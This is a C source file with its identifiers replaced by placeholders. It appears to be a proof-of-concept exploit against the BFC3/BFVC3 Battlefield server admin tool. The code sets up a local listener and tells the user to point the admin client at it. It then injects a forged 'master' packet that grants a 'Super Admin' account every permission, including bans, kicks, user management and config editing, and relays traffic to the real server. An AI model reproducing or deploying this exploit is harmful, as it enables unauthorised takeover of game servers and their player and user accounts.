
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int u_char ;
struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {int sin_family; int sin_port; TYPE_1__ sin_addr; } ;
struct sockaddr {int dummy; } ;
typedef int peer ;
typedef int on ;
typedef int fd_set ;


 int VAR_0 ;
 scalar_t__ FUNC_0 (int,int *) ;
 int FUNC_1 (int,int *) ;
 int FUNC_2 (int *) ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int FUNC_3 (int,struct sockaddr*,int*) ;
 scalar_t__ FUNC_4 (int,struct sockaddr*,int) ;
 scalar_t__ FUNC_5 (int *) ;
 int FUNC_6 (int) ;
 int FUNC_7 (int *,int,int,int ) ;
 int FUNC_8 (int ) ;
 scalar_t__ FUNC_9 (int,int ) ;
 int FUNC_10 (char*,...) ;
 int FUNC_11 (int,int *,int) ;
 scalar_t__ FUNC_12 (int,int *,int *,int *,int *) ;
 int FUNC_13 (int,int *,int,int ) ;
 int FUNC_14 (int,char*,char*,char*,char*,char*,char*,char*,int *) ;
 scalar_t__ FUNC_15 (int,int ,int ,char*,int) ;
 int FUNC_16 (int ,int ,int ) ;
 int FUNC_17 () ;
 int VAR_8 ;

void FUNC_18(int VAR_9, u_char *VAR_10, int VAR_11) {
    struct sockaddr_in VAR_12;
    fd_set VAR_13;
    int VAR_14,
            VAR_15,
            VAR_16 = 1,
            VAR_17,
            VAR_18,
            VAR_19;

    VAR_12.sin_addr.s_addr = VAR_1;
    VAR_12.sin_port = FUNC_8(VAR_3);
    VAR_12.sin_family = VAR_0;
    VAR_18 = sizeof(VAR_12);

    FUNC_10("- bind port %hu\n", VAR_3);

    VAR_14 = FUNC_16(VAR_0, VAR_4, VAR_2);
    if(VAR_14 < 0) FUNC_17();
    if(FUNC_15(VAR_14, VAR_5, VAR_7, (char *)&VAR_16, sizeof(VAR_16))
      < 0) FUNC_17();
    if(FUNC_4(VAR_14, (struct sockaddr *)&VAR_12, sizeof(VAR_12))
      < 0) FUNC_17();
    if(FUNC_9(VAR_14, VAR_6)
      < 0) FUNC_17();

    FUNC_10("- launch BFC3 or BFVC3 and sets %s as server and %hu as port\n",
        "127.0.0.1", VAR_3);

    VAR_15 = FUNC_3(VAR_14, (struct sockaddr *)&VAR_12, &VAR_18);
    if(VAR_15 < 0) FUNC_17();

    FUNC_10("- connected\n");

    FUNC_14(VAR_15,
        "master",
        "null/null/null/0/Map_True/"
        "Action-Warn" "\xff" "1" "\xff"
        "Action-Kick" "\xff" "1" "\xff"
        "Action-Insta-Kick (No Reason)" "\xff" "1" "\xff"
        "Action-Ban" "\xff" "1" "\xff"
        "Action-Insta-Ban (No Reason)" "\xff" "1" "\xff"
        "Action-Remove Ban" "\xff" "1" "\xff"
        "Action-Clear Banlist" "\xff" "1" "\xff"
        "Action-Force to Other Team" "\xff" "1" "\xff"
        "Action-Kill Player" "\xff" "1" "\xff"
        "Action-Send Message to Server" "\xff" "1" "\xff"
        "Game-Pause" "\xff" "1" "\xff"
        "Game-Toggle Auto-Balance" "\xff" "1" "\xff"
        "Action-Request PB Screenshot" "\xff" "1" "\xff"
        "BFVC3-Maps Change Maps" "\xff" "1" "\xff"
        "BFVC3-Maps Change 2 Map NOT in " "\xff" "1" "\xff"
        "BFVC3-Maps Restart Map" "\xff" "1" "\xff"
        "BFVC3-Maps Set Next Map" "\xff" "1" "\xff"
        "BFVC3-Admin Change Server Settings" "\xff" "1" "\xff"
        "BFVC3-Admin Change FF Settings" "\xff" "1" "\xff"
        "BFVC3-Admin Change Misc Settings" "\xff" "1" "\xff"
        "BFVC3-Admin Change Voting Settings" "\xff" "1" "\xff"
        "USERS-Access User Accounts" "\xff" "1" "\xff"
        "USERS-Edit User Profiles" "\xff" "1" "\xff"
        "USERS-Create User" "\xff" "1" "\xff"
        "USERS-Edit User" "\xff" "1" "\xff"
        "USERS-Delete User" "\xff" "1" "\xff"
        "BFVCC-Access Manager Control Panel" "\xff" "1" "\xff"
        "BFVCC-Access to Auto Admin Settings" "\xff" "1" "\xff"
        "BFVCC-Load Manager Profiles" "\xff" "1" "\xff"
        "BFVCC-Save Changes to Profiles" "\xff" "1" "\xff"
        "BFVCC-Create Manager Profiles" "\xff" "1" "\xff"
        "BFVCC-Delete Manager Profiles" "\xff" "1" "\xff"
        "CC-Access the CC Editor" "\xff" "1" "\xff"
        "CC-Save Changes to CC Profiles" "\xff" "1" "\xff"
        "CC-Create new CC Profiles" "\xff" "1" "\xff"
        "CC-Delete CC Profile" "\xff" "1" "\xff"
        "CC-Change a Maps CC Profile" "\xff" "1" "\xff"
        "PB-Edit PB Config Files" "\xff" "1" "\xff",
        "15567",
        "admin" "\xff",
        "True",
        "Super Admin",
        "0",
        ((void*)0));

    VAR_19 = ((VAR_9 > VAR_15) ? VAR_9 : VAR_15) + 1;

    for(;;) {
        FUNC_2(&VAR_13);
        FUNC_1(VAR_9, &VAR_13);
        FUNC_1(VAR_15, &VAR_13);
        if(FUNC_12(VAR_19, &VAR_13, ((void*)0), ((void*)0), ((void*)0))
          < 0) FUNC_17();

        if(FUNC_0(VAR_15, &VAR_13)) {
            VAR_17 = FUNC_11(VAR_15, VAR_10, VAR_11);
            FUNC_7(VAR_10, VAR_17, 1, VAR_8);

            if(FUNC_5(VAR_10)) continue;

            VAR_17 = FUNC_13(VAR_9, VAR_10, VAR_17, 0);
            if(VAR_17 < 0) FUNC_17();
        }

        if(FUNC_0(VAR_9, &VAR_13)) {
            VAR_17 = FUNC_11(VAR_9, VAR_10, VAR_11);
            FUNC_7(VAR_10, VAR_17, 1, VAR_8);

            if(FUNC_5(VAR_10)) continue;

            VAR_17 = FUNC_13(VAR_15, VAR_10, VAR_17, 0);
            if(VAR_17 < 0) FUNC_17();
        }
    }

    FUNC_6(VAR_15);
    FUNC_6(VAR_14);
}
